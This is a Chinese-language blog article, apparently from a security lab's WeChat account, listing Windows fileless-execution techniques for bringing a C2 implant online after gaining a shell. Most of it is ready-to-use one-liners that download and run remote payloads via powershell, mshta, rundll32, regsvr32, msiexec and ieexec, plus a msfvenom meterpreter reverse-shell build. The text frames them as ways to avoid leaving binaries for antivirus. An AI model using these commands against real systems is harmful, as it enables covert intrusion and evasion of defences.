<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GqgFDi8hJ3NcN8c98yIXuw)

![](https://mmbiz.qpic.cn/mmbiz_gif/vnT4hbaLoX5J1VZCVndQceEd50LP5ZcZfHY0maZdjCibzYW3P3hSEGxmwQVhYonEJBGxHeGmyLnibCXFtTcYkQVg/640?wx_fmt=gif)

{

**点击蓝色**

 

**关注我们**

}

![](https://mmbiz.qpic.cn/mmbiz_jpg/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnOUGzQLuzP37icFJaVvBWBTu4JgiceNbTshL9gias9aCqkW9voORu4bTug/640?wx_fmt=jpeg)
-------------------------------------------------------------------------------------------------------------------------------------------------

**前言**
======

在我们渗透过程中，当 getshell 或者能够执行命令后需要上线 C2 时，一般是执行下载（或上传）将文件写入目标服务器后执行。这种方式会留下一个二进制文件可能会被扫描查杀。  

而通过一些系统或组件自带命令进行文件不落地执行，这种方式不会留下二进制文件，更具有隐蔽性。本文将列举一些文件不落地的命令方法。

**powershell**
==============

在 win7/2008 开始引入的一种跨平台的任务自动化解决方案，由命令行 shell、  
脚本语言和配置管理框架组成。  
powershell 功能十分强大。一行命令即可直接执行远程文件。**  
**文件路径：****

*   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    

**支持系统：** >= win7/win2008

**用法：**

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/test.ps1'))"

```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08lvHwLq5aMeCEpxIy10jMl6Iqo5icbG25pAHCVqVE0dtK8TfrcNW9GaYcicYQkhSPA1y23lngQP4cA/640?wx_fmt=png)

**mshta**
=========

mshta.exe 是 Windows 操作系统内置程序，用于执行. hta 文件（HTML 应用程序）

**文件路径：**

*   C:\Windows\System32\mshta.exe
    

**支持系统：** win7-win11

**用法：**

```
vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")")) 
mshta http://webserver/payload.hta 
/cmd /c mshta.exe javascript:a(GetObject("script:http://1.1.1.1/m.sct")).Exec();close();

```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08lvHwLq5aMeCEpxIy10jMljJYZrATXia4ugjMPOw6oVtuY6R8Qkic9VNWxInNPlLHaVhml2o1OS70g/640?wx_fmt=png)

**rundll32**
============

Rundll32.exe 是 win 系统非常重要的核心程序。它的作用是执行 DLL 文件, 在命令行下调用动态链接程序库。  
系统中还有一个 Rundll64.exe 文件，它的意思是 "执行 64 位的 DLL 文件"，这两个是病毒软件制作者的最爱，也是在以往病毒分析报告中出现最多的应用媒介

**文件路径：**

*   C:\Windows\System32\rundll32.exe
    

**支持系统：** win7 -win11

**用法：**

```
远程加载：
C:\Windows\SysWOW64\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://192.168.1.4/Rundll32_shellcode"

```

执行远程文件

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08lvHwLq5aMeCEpxIy10jMl2aiaQvyzBsuFSRzaspJ6Tw8e07K5yqcfDf0APG4aTzBaOAKrd5ibF0LA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08lvHwLq5aMeCEpxIy10jMl2aiaQvyzBsuFSRzaspJ6Tw8e07K5yqcfDf0APG4aTzBaOAKrd5ibF0LA/640?wx_fmt=png)

**Regsvr32**
============

Regsvr32 是用于注册 COM 组件，Windows 命令行下提供的注册控件或者卸载控件的命令

**文件路径：**

*   C:\Windows\System32\Regsvr32.exe
    

**支持系统：** win7 -win11

**用法：**

```
regsvr32 /u /n /s /i:http://192.168.173.45:8800/file.sct scrobj.dll

```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08lvHwLq5aMeCEpxIy10jMlRlWEIYFKicVHLNruXxXTAanUEVHcXCuMJFzmK2J0oFlpeoqNUqCWJxg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08lvHwLq5aMeCEpxIy10jMlkvS4Y5vLAkfbFw1JTQnuotys9XSyI5XzSMibMWsWMoYroymey8icT6mQ/640?wx_fmt=png)

**Msiexec.exe**
===============

win 核心应用，用于安装 msi 包。是 Windows Installer 的一部分。

**文件路径：**

*   C:\Windows\System32\msiexec.exe
    

**支持系统：** win7 -win11

**用法：**

```
msiexec.exe /q /i http://192.168.173.45/test.msi

```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.14.1 -f msi > test.msi 
msiexec.exe /q /i http://192.168.173.45/test.msi

```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08lvHwLq5aMeCEpxIy10jMlw0fyQhgIdyESnX06iaOHqQib60yKz6pZIFRvegDxth7dpmewpcK5SHFA/640?wx_fmt=png)

**IEexec**
==========

IEexec.exe 是. NET Framework 附带程序，.NET 框架在 win 系统自带。  
而同目录下的 Csc.exe 就是 C# 的语言编译器**  
**文件路径：****

*   C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
    

**支持系统：** win7 -win11

**用法：**

```
cd C:\Windows\Microsoft.NET\Framework64\v2.0.50727 
caspol -s off 
ieexec http://ip:8080/test.exe

```

**总结**
======

这里只列举了一些常用不落地执行方法，当然还有很多方法比如利用特定版本中组件的方法。使用这些方法需要满足出网条件，实战中还是需要开阔思路，找到现有场景中的缺陷才能 bypass

### **往期回顾**

01

  

[网络空间搜索引擎使用技巧](https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247524697&idx=1&sn=852dfdb59b30beb93d3b7aa8cb03a930&chksm=ec2640c1db51c9d752256fa2fbb0a3e32c476ea510d7a1cd242438d477aece3c31a3e1cb7ce6&scene=21#wechat_redirect)  

02

  

  
[两个账户劫持案例](https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247521375&idx=1&sn=761542f38880711581c79a3bb7001709&chksm=ec26b5c7db513cd1bd7b90764370343fa0338e0c1dd04438f382e79a79eda27981bb7bf9a65b&scene=21#wechat_redirect)  

03

  

[  
](http://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247516613&idx=1&sn=be28c29022335c68d6048dc45da4bdd7&chksm=ec26a05ddb51294bfd8ab5c9199d64eae120b895782a5eb52b4d9bdf42d2455662858126051b&scene=21#wechat_redirect)[后渗透之 windows 中远程下载文件 tips](https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247521148&idx=1&sn=9a543804a822a7ac2fa080dea370817f&chksm=ec26b2e4db513bf232fbb8291d1588a76541f8b1da3075d01cd7fea14e0f450111169df4e398&scene=21#wechat_redirect)  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08P2lHs2gMuphdmUxyKIQR1YoniczDqibgwjKkLqegFsBvq5bdUibgAhzoJnJuaHEYGZ7icTO3MNaIWjg/640?wx_fmt=png)

**雷石安全实验室**

商务咨询：

0571-87031601

商务邮箱：

mtn@motanni.com

![](https://mmbiz.qpic.cn/mmbiz_gif/RXib24CCXQ09P8KpHiakzNxaeiaNpy9QJOicjS63gTVQ57eX4n7jnfk65micFGf1RP4kWh87kuM8w5dO5s6vsSx49yw/640?wx_fmt=gif)

觉得文章不错，记得【点赞、在看、转发】！！！